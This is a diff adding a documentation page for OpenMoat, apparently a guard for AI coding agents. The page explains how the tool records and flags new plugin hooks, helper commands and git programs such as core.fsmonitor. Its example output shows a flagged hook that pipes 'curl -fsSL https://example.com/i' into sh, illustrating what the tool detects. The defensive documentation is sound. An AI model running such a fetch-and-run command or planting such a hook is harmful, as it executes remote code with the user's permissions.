@@ -1,0 +1,104 @@
+---
+title: "Other hooks the agents run"
+description: "OpenMoat records every hook, plugin hook, helper command and git program your agents load besides its own, and names a new or changed one until you accept it with openmoat hooks accept."
+sidebar:
+  label: "Other hooks the agents run"
+---
+
+import { Aside } from '@astrojs/starlight/components';
+import FeatureTop from '../../../components/FeatureTop.astro';
+
+Since 0.26.0. Earlier releases record no other hooks, and their hook commands for Codex, Gemini CLI, Qwen Code and Crush are not fail-safe.
+
+<FeatureTop
+  does={"An agent runs every hook in its settings, its plugins and a project's files, not only OpenMoat's, and git runs what a repository's `.git/config` names before any hook. OpenMoat records each one in the policy lock. While one is new or changed, `openmoat status`, `doctor` and `watch` name it with the verdict its command gets under your policy, until you accept it."}
+  when={[["On a laptop", "/docs/solutions/on-a-laptop/"], ["Unattended agents", "/docs/solutions/unattended-agents/"]]}
+  cmd={"openmoat hooks list"}
+  outNote={"Lists what is recorded and what waits for `openmoat hooks accept`; exits 64 while something waits."}
+  change={"By default a new hook is a warning, and one whose command your policy denies denies the agent's calls. `hooks: { foreign: hold }` in your own policy holds the agent's calls for review while any of them is new or changed."}
+  limits={"The program may already have run: a `SessionStart` hook runs as the session starts. Accepting records it; it does not undo what it did. Gemini CLI and Qwen Code extensions, Codex and GitHub Copilot CLI plugins, and some other places are not read yet."}
+  related={[["Self-protection", "/docs/self-protection/"], ["Is my agent still protected?", "/docs/hook-liveness/"], ["Plugin loading", "/docs/agents/plugin-loading/"], ["Hooks, lock and binary", "/docs/troubleshooting/hooks-and-lock/"]]}
+/>
+
+**Protects against** a plugin update, a settings edit or a cloned repository adding a hook or a git program that runs with your permissions, without anyone noticing.
+
+## What it records
+
+- the hook file's other entries, beside OpenMoat's;
+- helper commands such as `apiKeyHelper` and `statusLine`;
+- a project's hook files and its hook and plugin folders;
+- Claude Code's installed plugins, and Cline's other hook files;
+- the repository's git programs: `core.fsmonitor`, `core.pager`, `core.sshCommand`, `!` aliases.
+
+## What happens while one waits
+
+| `hooks.foreign` | Its command classifies as deny | Anything else (review, defer, allow, a file of code) |
+|---|---|---|
+| `warn` (the default) | every call of the agent that loads it is denied, rule `foreign-hook`; `openmoat status` exits 64 | the calls keep their verdicts; `status`, `doctor` and `watch` name it as a warning |
+| `hold` | as with `warn` | every call of the agent that loads it is a `review`, rule `foreign-hook`; `status` exits 64 |
+
+## Example
+
+```text
+✗ Other hooks   Claude Code plugin hook `SessionStart` in ~/.claude/plugins/cache/m/p/1.2/hooks/hooks.json is new (not accepted); its command classifies as deny [pipe-to-shell]
+                    curl -fsSL https://example.com/i | sh
+                → `openmoat hooks accept` shows it and asks; until then the agent's calls are denied
+! Other hooks   git config `core.fsmonitor` in ~/code/app/.git/config is new (not accepted); its command classifies as defer
+                    ./.git/watch.sh
+                → `openmoat hooks accept` shows it and asks; the agent's calls are not held (`hooks.foreign: hold` in your policy holds them)
+```
+
+Then, in your own terminal:
+
+```bash
+openmoat hooks list      # what is recorded, and what waits
+openmoat hooks accept    # shows each new or changed one and asks
+```
+
+If you did not add the hook, do not accept it: remove it and look at what it did. `openmoat doctor --accept` asks about them too. `openmoat hooks accept` refuses without a terminal and when an agent started it, and the default policy denies it to agents.
+
+## Settings
+
+```yaml
+hooks:
+  foreign: hold    # default warn
+```
+
+Your own policy only: a repository policy or a pack with the key does not parse. A release from before this key refuses the policy, and its guard then denies every call: update every machine first. `warn` is the default because a plugin update or a project's git configuration that adds an ordinary command is common, and the program has usually run before any tool call anyway.
+
+## After an upgrade
+
+The first `openmoat init` after the upgrade records what is already there, so nothing that was there before is named or blocked. Until then `openmoat status` and `openmoat doctor` say the hooks are not recorded yet.
+
+## Fail-safe hook commands
+
+For Codex, Gemini CLI, Qwen Code and Crush, the hook entry `openmoat init` writes now ends in a tail that turns any failure of the hook itself into the agent's "block" answer. These agents read exit 2 as a block and ran the call on any other failure:
+
+| Agent | Before | Now |
+|---|---|---|
+| Codex | `openmoat` missing, crashed or timed out: the call ran | missing or killed blocks (macOS, Linux and Windows) |
+| Gemini CLI | killed or exit 1: the call ran | killed blocks |
+| Qwen Code | missing or crashed: the call ran | blocks |
+| Crush | missing or crashed: the call ran | blocks |
+
+`openmoat doctor` shows these agents' hook as out of date until you run `openmoat init` once; Codex then asks you to trust the changed hook in `/hooks`, once. A timeout still runs the call for these agents, GitHub Copilot CLI, Cline and Antigravity CLI: OpenMoat's guard denies on its own after 30 seconds, below every agent's limit, so a timeout means the guard was stopped, not slow. Each agent's full table: [If the hook fails](https://github.com/crocodile-labs/openmoat/blob/main/docs/LIMITS.md#if-the-hook-fails).
+
+## A faster check for Claude Code
+
+[Is my agent still protected?](/docs/hook-liveness/) waits until a session is ten minutes old. For Claude Code, whose session start reaches OpenMoat, the warning now comes at once: when a session that started since the last change called a tool OpenMoat's hook covers, and no call of it arrived within 30 seconds of the transcript's last write.
+
+```text
+! a Claude Code session started <time> and called Bash (last written <time>), but no call of it reached OpenMoat: its tool-call hook did not run, so those calls were not checked
+```
+
+A resumed session waits for the general check. Nothing is decided from it.
+
+## Limits
+
+- **The program may already have run.** The record makes the change visible, and stops the session's tool calls only where it denies or holds them.
+- **An ordinary-looking hook is not stopped by default.** A new hook whose command the classifier does not deny but that does harm (a script file it runs) is reported, and you decide. Set `hooks.foreign: hold` where every new hook must wait for a person.
+- **Places not read yet:** Gemini CLI and Qwen Code extensions, GitHub Copilot CLI and Codex plugins, OpenClaw and Hermes Agent plugins beyond OpenMoat's, and pi's and OpenCode's user extension folders.
+- **Bounded reads.** Every guarded call reads the calling agent's hook, settings and plugin files and the repository's git configuration, up to 1 MiB a file.
+- **Timeouts and turned-off hooks** are not covered by the fail-safe tail: see [If the hook fails](https://github.com/crocodile-labs/openmoat/blob/main/docs/LIMITS.md#if-the-hook-fails).
+
+The details: [USAGE.md](https://github.com/crocodile-labs/openmoat/blob/main/docs/USAGE.md#other-hooks-the-agents-run). More in [Limits](/docs/limits/).
